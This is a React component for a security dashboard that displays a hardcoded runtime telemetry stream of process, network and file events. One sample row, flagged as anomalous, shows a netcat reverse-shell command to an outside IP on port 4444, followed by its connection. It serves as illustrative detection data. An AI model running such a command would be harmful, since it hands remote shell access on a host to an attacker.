import React from 'react';
import { Card, CardContent } from '@/components/ui/card';
import { Activity, Terminal, Globe, File } from 'lucide-react';

export default function RuntimeEventViewer() {
  return (
    <div className="p-8 space-y-6 bg-slate-950 min-h-screen text-slate-100 font-sans border-t border-slate-800">
        
        <div className="border-b border-slate-800 pb-4 mb-6">
            <h2 className="text-2xl font-bold flex items-center gap-2 text-slate-200">
                <Activity className="text-indigo-400" />
                Runtime Telemetry Stream
            </h2>
            <p className="text-slate-400 mt-1">Live OS-level events (processes, network, files) ingested from workload agents.</p>
        </div>

        <Card className="bg-black border-slate-800 font-mono text-sm">
            <CardContent className="p-0">
                <div className="bg-slate-900 px-4 py-2 border-b border-slate-800 flex justify-between text-xs font-bold text-slate-500 uppercase tracking-widest">
                    <span>Timestamp</span>
                    <span>Event Type</span>
                    <span>Details</span>
                </div>
                
                <div className="divide-y divide-slate-900">
                    
                    <EventRow 
                        time="10:45:12.301" 
                        type="PROCESS_START" 
                        icon={<Terminal size={14} className="text-sky-400"/>}
                        details="/usr/bin/nginx -g daemon off;" 
                    />
                    
                    <EventRow 
                        time="10:45:15.912" 
                        type="NETWORK_CONN" 
                        icon={<Globe size={14} className="text-emerald-400"/>}
                        details="TCP 443 -> 10.0.5.21 (ESTABLISHED)" 
                    />
                    
                    <EventRow 
                        time="10:46:01.002" 
                        type="FILE_MOD" 
                        icon={<File size={14} className="text-amber-400"/>}
                        details="/var/log/nginx/access.log (APPEND)" 
                    />

                    {/* Anomalous Event */}
                    <div className="flex gap-4 p-4 hover:bg-slate-900/50 transition-colors bg-rose-950/20 border-l-2 border-rose-500">
                        <div className="text-slate-500 shrink-0 w-24">10:48:19.441</div>
                        <div className="text-rose-400 font-bold shrink-0 w-36 flex items-center gap-2">
                            <Terminal size={14} /> PROCESS_START
                        </div>
                        <div className="text-rose-300 break-all">
                            /bin/sh -c "nc -e /bin/sh 185.12.3.4 4444"
                        </div>
                    </div>

                    <EventRow 
                        time="10:48:20.100" 
                        type="NETWORK_CONN" 
                        icon={<Globe size={14} className="text-rose-400"/>}
                        details="TCP 4444 -> 185.12.3.4 (ESTABLISHED) [ANOMALY]" 
                    />

                </div>
            </CardContent>
        </Card>
    </div>
  );
}

function EventRow({ time, type, icon, details }: any) {
    return (
        <div className="flex gap-4 p-4 hover:bg-slate-900/50 transition-colors">
            <div className="text-slate-600 shrink-0 w-24">{time}</div>
            <div className="text-slate-300 font-bold shrink-0 w-36 flex items-center gap-2">
                {icon} {type}
            </div>
            <div className="text-slate-400 break-all">
                {details}
            </div>
        </div>
    );
}
